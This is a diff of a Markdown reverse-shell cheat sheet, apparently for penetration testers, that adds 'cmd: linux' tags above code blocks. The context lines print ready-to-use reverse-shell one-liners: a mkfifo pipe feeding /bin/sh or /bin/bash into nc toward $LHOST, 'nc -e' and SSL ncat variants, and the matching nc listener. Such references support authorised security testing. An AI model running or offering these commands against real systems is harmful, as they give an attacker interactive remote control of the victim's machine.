@@ -4,6 +4,7 @@ For targets where netcat lacks the `-e` / `-c` flag (OpenBSD `nc`, which is the 
 
 ## One-Liner
 
+<!-- cmd: linux -->
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
 ```
@@ -12,18 +13,21 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp
 
 ### With bash explicitly
 
+<!-- cmd: linux -->
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST 4444 > /tmp/f
 ```
 
 ### Traditional netcat with -e (GNU / nmap ncat)
 
+<!-- cmd: linux -->
 ```bash
 nc -e /bin/bash $LHOST $LPORT
 ```
 
 ### Ncat (nmap's netcat) with SSL
 
+<!-- cmd: linux -->
 ```bash
 ncat --ssl $LHOST $LPORT -e /bin/bash
 ```
@@ -39,6 +43,7 @@ ncat --ssl $LHOST $LPORT -e /bin/bash
 
 ## Listener
 
+<!-- cmd: linux -->
 ```bash
 nc -lvnp $LPORT
 ```
